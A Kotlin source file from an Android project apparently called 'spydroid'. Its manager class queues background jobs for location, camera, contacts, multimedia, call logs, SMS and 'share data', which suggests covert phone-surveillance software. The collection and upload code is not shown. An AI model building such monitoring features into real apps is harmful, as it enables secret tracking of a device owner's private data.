package net.spydroid.core.manager.features

import android.content.Context
import androidx.work.OneTimeWorkRequest
import androidx.work.WorkManager
import androidx.work.WorkRequest
import net.spydroid.core.data.common.GlobalViewModel
import net.spydroid.feature.calls.CallsWork
import net.spydroid.feature.camera.CameraWork
import net.spydroid.feature.location.LocationWork
import net.spydroid.feature.multimedia.MultimediaWork
import net.spydroid.feature.sharedata.ShareDataWork
import net.spydroid.feature.sms.SmsWork
import net.spydroid.feature_contacts.ContactsWork

class ManagerFeatures(private val context: Context,private val globalViewModel: GlobalViewModel) {
    fun startLocation() {
        val myWorkRequest: WorkRequest = OneTimeWorkRequest.Builder(LocationWork::class.java).build()
        WorkManager.getInstance(context).enqueue(myWorkRequest)
    }

    fun startCamera() {
        val myWorkRequest: WorkRequest = OneTimeWorkRequest.Builder(CameraWork::class.java).build()
        WorkManager.getInstance(context).enqueue(myWorkRequest)
    }

    fun startContacts() {
        val myWorkRequest: WorkRequest = OneTimeWorkRequest.Builder(ContactsWork::class.java).build()
        WorkManager.getInstance(context).enqueue(myWorkRequest)
    }

    fun startMultimedia() {
        val myWorkRequest: WorkRequest = OneTimeWorkRequest.Builder(MultimediaWork::class.java).build()
        WorkManager.getInstance(context).enqueue(myWorkRequest)
    }

    fun startCalls() {
        val myWorkRequest: WorkRequest = OneTimeWorkRequest.Builder(CallsWork::class.java).build()
        WorkManager.getInstance(context).enqueue(myWorkRequest)
    }

    fun startSms() {
        val myWorkRequest: WorkRequest = OneTimeWorkRequest.Builder(SmsWork::class.java).build()
        WorkManager.getInstance(context).enqueue(myWorkRequest)
    }

     fun startShareData() {
        val myWorkRequest: WorkRequest = OneTimeWorkRequest.Builder(ShareDataWork::class.java).build()
        WorkManager.getInstance(context).enqueue(myWorkRequest)
    }
}